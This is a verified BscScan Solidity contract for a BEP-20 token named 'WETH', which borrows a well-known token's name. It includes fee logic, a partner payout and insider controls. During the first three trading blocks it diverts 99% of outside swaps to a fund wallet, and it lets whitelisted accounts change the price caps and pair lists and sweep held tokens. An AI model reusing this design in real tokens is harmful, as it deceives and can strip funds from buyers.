/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;
    uint256 private constant MAX = ~uint256(0);

    address public fundAddress;

    mapping(address => bool) public _swapPairList;
    mapping(address => bool) public _feeWhiteList;

    uint256 private constant _buyPartnerFee = 600;
    uint256 private constant _buyFundFee = 200;

    uint256 private constant _sellPartnerFee = 600;
    uint256 private constant _sellFundFee = 200;

    uint256 private constant _transferFee = 200;

    uint256 public startTradeBlock;
    address public immutable _mainPair;
    address public immutable _usdt;

    uint256 public _partnerRewardCondition;

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address ReceiveAddress, address FundAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address usdtPair = swapFactory.createPair(address(this), USDTAddress);
        _swapPairList[usdtPair] = true;
        _mainPair = usdtPair;
        _usdt = USDTAddress;

        uint256 tokenUnit = 10 ** Decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);
        fundAddress = FundAddress;

        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

        _partnerRewardCondition = 100 * tokenUnit;
        _partnerList.push(address(0x4D3A5302d3532aa8b863101B2c8E3aC4E372FC46));
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    address public _lastMaybeAddLPAddress;

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "BNE");

        if (0 == startTradeBlock) {
            if (_feeWhiteList[from] && to == _mainPair) {
                startTradeBlock = block.number;
            }
        }

        uint256 day = today();
        if (0 == dayPrice[day]) {
            dayPrice[day] = tokenPrice();
        }

        if (_swapPairList[from]) {
            _checkCanBuy(to);
        }

        bool takeFee;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            takeFee = true;

            uint256 maxSellAmount = balance * 99999 / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }

            if (_swapPairList[from] || _swapPairList[to]) {
                require(0 < startTradeBlock, "!T");
                if (block.number < startTradeBlock + 3) {
                    _funTransfer(from, to, amount);
                    return;
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee);

        if (from != address(this)) {
            if (takeFee) {
                processPartnerDividend();
            }
        }

        if (_swapPairList[from]) {
            _checkCanBuy(to);
        }
    }

    function _funTransfer(address sender, address recipient, uint256 tAmount) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 fundFeeAmount;
            uint256 partnerFeeAmount;
            if (_swapPairList[sender]) {//Buy
                fundFeeAmount = tAmount * _buyFundFee / 10000;
                partnerFeeAmount = tAmount * _buyPartnerFee / 10000;
            } else if (_swapPairList[recipient]) {//Sell
                fundFeeAmount = tAmount * _sellFundFee / 10000;
                partnerFeeAmount = tAmount * _sellPartnerFee / 10000;
            } else {//Transfer
                fundFeeAmount = tAmount * _transferFee / 10000;
            }

            if (fundFeeAmount > 0) {
                feeAmount += fundFeeAmount;
                _takeTransfer(sender, fundAddress, fundFeeAmount);
            }

            if (partnerFeeAmount > 0) {
                feeAmount += partnerFeeAmount;
                _takeTransfer(sender, address(this), partnerFeeAmount);
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _takeTransfer(address sender, address to, uint256 tAmount) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    modifier onlyWhiteList() {
        address msgSender = msg.sender;
        require(_feeWhiteList[msgSender] && (msgSender == fundAddress || msgSender == _owner), "nw");
        _;
    }

    function setFundAddress(address addr) external onlyWhiteList {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyWhiteList {
        _feeWhiteList[addr] = enable;
    }

    function batchSetFeeWhiteList(address [] memory addr, bool enable) external onlyWhiteList {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyWhiteList {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }

    receive() external payable {}

    address[] private _partnerList;

    function addPartner(address addr) external onlyWhiteList {
        _partnerList.push(addr);
    }

    function addPartnerList(address[] memory adrList) external onlyWhiteList {
        uint256 len = adrList.length;
        for (uint256 i; i < len; ++i) {
            _partnerList.push(adrList[i]);
        }
    }

    function setPartnerList(address[] memory adrList) external onlyWhiteList {
        _partnerList = adrList;
    }

    function getPartnerList() external view returns (address[] memory){
        return _partnerList;
    }

    function processPartnerDividend() private {
        uint256 len = _partnerList.length;
        if (0 == len) {
            return;
        }
        address sender = address(this);
        uint256 rewardBalance = balanceOf(sender);
        if (rewardBalance < _partnerRewardCondition) {
            return;
        }

        uint256 perAmount = rewardBalance / len;
        _balances[sender] = _balances[sender] - perAmount * len;

        for (uint256 i; i < len;) {
            _takeTransfer(sender, _partnerList[i], perAmount);
        unchecked{
            ++i;
        }
        }
    }

    mapping(uint256 => uint256) public dayPrice;
    uint256 public immutable _dailyDuration = 86400;
    uint256 public maxPriceRate = 11000;

    function today() public view returns (uint256){
        return block.timestamp / _dailyDuration;
    }

    function tokenPrice() public view returns (uint256){
        ISwapPair swapPair = ISwapPair(_mainPair);
        (uint256 reverse0,uint256 reverse1,) = swapPair.getReserves();
        uint256 usdtReverse;
        uint256 tokenReverse;
        if (_usdt < address(this)) {
            usdtReverse = reverse0;
            tokenReverse = reverse1;
        } else {
            usdtReverse = reverse1;
            tokenReverse = reverse0;
        }
        if (0 == tokenReverse) {
            return 0;
        }
        return 10 ** _decimals * usdtReverse / tokenReverse;
    }

    function setMaxPriceRate(uint256 priceRate) external onlyWhiteList {
        maxPriceRate = priceRate;
    }

    function _checkCanBuy(address to) private view {
        uint256 todayPrice = dayPrice[today()];
        if (0 == todayPrice) {
            return;
        }
        uint256 price = tokenPrice();
        uint256 priceRate = price * 10000 / todayPrice;
        require(priceRate <= maxPriceRate, "maxPriceRate");

        uint256 pairToken = balanceOf(_mainPair);
        uint256 pairUsdt = IERC20(_usdt).balanceOf(_mainPair);
        price = 10 ** _decimals * pairUsdt / pairToken;
        priceRate = price * 10000 / todayPrice;
        require(priceRate <= maxPriceRate, "maxPriceRate");
    }
}

contract WETH is AbsToken {
    constructor() AbsToken(
    //SwapRouter
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
    //USDT
        address(0x55d398326f99059fF775485246999027B3197955),
        "WETH",
        "WETH",
        18,
        19000000,
    //Receive
        address(0x6C57C0C39b35b8170838A285946f4DC9D66e8926),
    //Fund
        address(0xB0486a04BdA7F90576186C294492BF7EB6d16D55)
    ){

    }
}